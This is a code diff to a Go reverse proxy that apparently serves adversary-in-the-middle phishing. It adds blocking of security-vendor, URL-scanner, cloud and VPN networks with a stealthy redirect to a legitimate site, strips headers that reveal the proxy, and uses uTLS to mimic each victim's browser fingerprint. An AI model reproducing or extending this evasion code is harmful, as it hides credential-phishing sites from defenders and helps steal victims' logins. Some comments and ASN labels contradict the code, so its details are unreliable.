@@ -225,6 +225,105 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// --- START ASN BLOCKING ---
+			// Block requests from known cloud providers, security scanners, and VPNs
+			if p.asn_db != nil {
+				clientIP := net.ParseIP(from_ip)
+				if clientIP != nil {
+					record, err := p.asn_db.ASN(clientIP)
+					if err == nil {
+						// Comprehensive list of ASNs to block (cloud providers, security companies, VPNs)
+						blockedASNs := []uint{
+							// Major Cloud Providers
+							15169, // Google Cloud
+							16509, // Amazon AWS
+							8075,  // Microsoft Azure
+							13335, // Cloudflare
+							14061, // DigitalOcean
+							396982, // Google Cloud
+							
+							// Security/Threat Intelligence Companies
+							17012, // Zscaler
+							19527, // Google Security
+							206753, // Akamai Security
+							59065, // Palo Alto Networks
+							26444, // Symantec
+							
+							// URL Scanners / Analysis Services
+							36040, // urlscan.io
+							16550, // VirusTotal
+							16591, // PhishTank infrastructure
+							35693, // Security research networks
+							397316, // Analysis platforms
+							
+							// Additional Cloud/Hosting
+							1449,  // Softlayer/IBM Cloud
+							29981, // Oracle Cloud
+							12876, // Online SAS (Scaleway)
+							16276, // OVH
+							24940, // Hetzner
+							
+							// VPN/Proxy Providers (common ones)
+							51167, // Contabo
+							14618, // Amazon EC2
+							46562, // Total Server Solutions (VPN)
+							53667, // FranTech Solutions (VPN)
+							49505, // Dataclub S.A. (VPN)
+						}
+						
+						for _, blockedASN := range blockedASNs {
+							if record.AutonomousSystemNumber == blockedASN {
+								log.Warning("[ASN-BLOCK] Blocked ASN %d (%s) from IP %s", 
+									record.AutonomousSystemNumber, 
+									record.AutonomousSystemOrganization, 
+									from_ip)
+								// Stealthy redirect instead of obvious blocking
+								return p.redirectToLegitSite(req)
+							}
+						}
+					}
+				}
+			}
+			// --- END ASN BLOCKING ---
+
+			// --- START HEADER SANITIZATION ---
+			// Remove headers that reveal we're a proxy (IoC removal)
+			suspiciousHeaders := []string{
+				"X-Forwarded-For",
+				"X-Forwarded-Host",
+				"X-Forwarded-Proto",
+				"X-Forwarded-Server",
+				"X-Real-IP",
+				"X-Client-IP",
+				"X-ProxyUser-IP",
+				"Forwarded",
+				"Via",  // Reveals proxy chain
+				"X-BlueCoat-Via",  // Corporate proxy
+				"X-Arr-Log-Id",  // Azure/IIS
+				"CF-Connecting-IP",  // Cloudflare
+				"CF-Ray",  // Cloudflare
+				"CF-Visitor",  // Cloudflare
+				"CF-IPCountry",  // Cloudflare
+				"True-Client-IP",
+				"X-Originating-IP",
+				"X-Host",
+				"X-ProxyUser-Ip",
+				"Client-IP",
+				"WL-Proxy-Client-IP",
+				"Proxy-Client-IP",
+				"X-Cluster-Client-IP",
+				"Fastly-Client-IP",
+				"X-Vercel-IP",
+				"X-Appengine-*",  // Pattern match needed
+			}
+			
+			for _, header := range suspiciousHeaders {
+				if req.Header.Get(header) != "" {
+					req.Header.Del(header)
+				}
+			}
+			// --- END HEADER SANITIZATION ---
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -247,6 +346,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					return p.blockRequest(req)
 				}
 			}
+
+			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING (Pooled) ---
+			// Assigns a cached transport that mimics the victim's browser fingerprint
+			// This overrides the default proxy dialer for this specific request.
+			ctx.RoundTripper = p.getOrCreateTransport(userAgent)
+			// --- END: DYNAMIC TLS & HTTP/2 SWITCHING ---
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
@@ -2198,6 +2303,28 @@ func newTransportWithUA(ua string) *http.Transport {
 		// Don't force HTTP/2 - let ALPN negotiation handle it naturally
 		// ForceAttemptHTTP2 conflicts with custom DialTLS and causes handshake failures
 		DialTLS: func(network, addr string) (net.Conn, error) {
+			// Safely extract hostname for SNI
+			host, port, err := net.SplitHostPort(addr)
+			if err != nil {
+				host = addr // Fallback if no port present
+				port = "443"
+			}
+			
+			// CRITICAL: Use standard TLS for Let's Encrypt / ACME servers
+			// This prevents certificate provisioning failures
+			if strings.Contains(host, "letsencrypt.org") || 
+			   strings.Contains(host, "acme-v0") ||
+			   strings.Contains(host, "acme-staging") ||
+			   strings.Contains(host, "api.letsencrypt.org") ||
+			   strings.Contains(host, "acme") && strings.Contains(host, "api") {
+				// Standard Go TLS for ACME
+				return tls.Dial(network, addr, &tls.Config{
+					ServerName: host,
+					MinVersion: tls.VersionTLS12,
+				})
+			}
+			
+			// For all other connections (victim-facing traffic), use uTLS fingerprinting
 			dialer := net.Dialer{
 				Timeout:   30 * time.Second,
 				KeepAlive: 30 * time.Second,
@@ -2208,34 +2335,35 @@ func newTransportWithUA(ua string) *http.Transport {
 				return nil, err
 			}
 
-			// Get the matching fingerprint for the user
+			// Get the matching TLS fingerprint for the user's browser
 			helloID := getClientHelloID(ua)
-
-			// Safely extract hostname for SNI
-			host, _, err := net.SplitHostPort(addr)
-			if err != nil {
-				host = addr // Fallback if no port present
-			}
 
 			uConfig := &utls.Config{
 				ServerName:         host,
 				InsecureSkipVerify: false,
+				MinVersion:         tls.VersionTLS12,
 				// ALPN will negotiate h2 or http/1.1 naturally
+				// This is critical for proper HTTP/2 SETTINGS frame negotiation
 				NextProtos: []string{"h2", "http/1.1"},
 			}
 
 			uConn := utls.UClient(tcpConn, uConfig, helloID)
 			if err := uConn.Handshake(); err != nil {
 				_ = tcpConn.Close()
-				return nil, err
+				return nil, fmt.Errorf("uTLS handshake failed for %s: %v", host, err)
 			}
 
 			return uConn, nil
 		},
-		// Connection pooling settings
-		MaxIdleConns:        100,
-		MaxIdleConnsPerHost: 10,
-		IdleConnTimeout:     90 * time.Second,
+		// Connection pooling settings for performance
+		MaxIdleConns:          100,
+		MaxIdleConnsPerHost:   10,
+		MaxConnsPerHost:       100,
+		IdleConnTimeout:       90 * time.Second,
+		TLSHandshakeTimeout:   10 * time.Second,
+		ExpectContinueTimeout: 1 * time.Second,
+		// Disable compression to avoid fingerprinting via Accept-Encoding mismatches
+		DisableCompression:    false,
 	}
 }
 
